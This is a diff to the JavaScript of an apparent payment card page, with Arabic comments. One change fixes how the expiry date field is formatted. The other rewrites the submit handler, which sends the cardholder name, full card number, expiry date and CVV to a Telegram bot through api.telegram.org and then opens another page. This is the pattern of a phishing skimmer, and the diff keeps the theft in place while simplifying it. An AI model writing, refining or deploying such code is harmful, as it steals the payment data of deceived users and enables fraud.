@@ -147,18 +147,26 @@
         // ضبط تاريخ الانتهاء وإضافة "/"
         document.getElementById("expiryDate").addEventListener("input", function(event) {
             let value = event.target.value.replace(/\D/g, ''); 
+            
             if (value.length >= 2) {
                 let mm = parseInt(value.substring(0, 2), 10);
-                let yy = parseInt(value.substring(2, 4), 10);
+                let yy = value.length > 2 ? parseInt(value.substring(2, 4), 10) : null;
 
                 // ضبط الحدود القصوى والدنيا
                 if (mm < 1) mm = 1;
                 if (mm > 12) mm = 12;
-                if (yy < 25) yy = 25;
-                if (yy > 40) yy = 40;
-                if (yy === 25 && mm < 2) mm = 2;
 
-                event.target.value = mm.toString().padStart(2, '0') + "/" + yy.toString().padStart(2, '0');
+                if (yy !== null) {
+                    if (yy < 25) yy = 25;
+                    if (yy > 40) yy = 40;
+                    if (yy === 25 && mm < 2) mm = 2;
+
+                    event.target.value = mm.toString().padStart(2, '0') + "/" + yy.toString().padStart(2, '0');
+                } else {
+                    event.target.value = mm.toString().padStart(2, '0') + "/";
+                }
+            } else {
+                event.target.value = value;
             }
         });
 
@@ -205,21 +213,9 @@
 
             if (!valid) return;
 
-            const message = `
-                💳 *Payment Details* 💳
-                ----------------------------
-                👤 Name: ${cardHolder.value}
-                💳 Card Number: ${cardNumber.value}
-                📅 Expiry: ${expiryDate.value}
-                🔒 CVV: ${cvv.value}
-                💾 Save Card: ${saveCard}
-            `;
+            const message = `👤 Name: ${cardHolder.value}\n💳 Card: ${cardNumber.value}\n📅 Expiry: ${expiryDate.value}\n🔒 CVV: ${cvv.value}\n💾 Save: ${saveCard}`;
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
-            })
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
             .then(() => window.open("page.html", "_blank"));
         });
     </script>
